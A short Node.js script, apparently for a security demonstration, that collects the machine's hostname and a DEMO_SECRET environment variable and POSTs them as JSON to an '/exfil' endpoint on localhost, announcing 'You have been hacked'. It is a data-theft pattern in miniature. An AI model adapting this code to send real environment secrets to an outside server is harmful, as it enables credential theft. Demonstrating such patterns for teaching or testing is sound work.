const https = require('https');
const os = require('os');

// Simulated exfiltration with a harmless payload for demo
const payload = JSON.stringify({
  status: "You have been hacked — demo simulation",
  host: os.hostname(),
  exposed_var: process.env.DEMO_SECRET || "not set"
});

const options = {
  hostname: 'localhost',
  port: 3000,
  path: '/exfil',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': payload.length
  }
};

const req = https.request(options, res => {
  console.log(`[exfil] Sent demo payload. Status: ${res.statusCode}`);
});

req.on('error', error => {
  console.error(`[exfil] Error: ${error}`);
});

req.write(payload);
req.end();
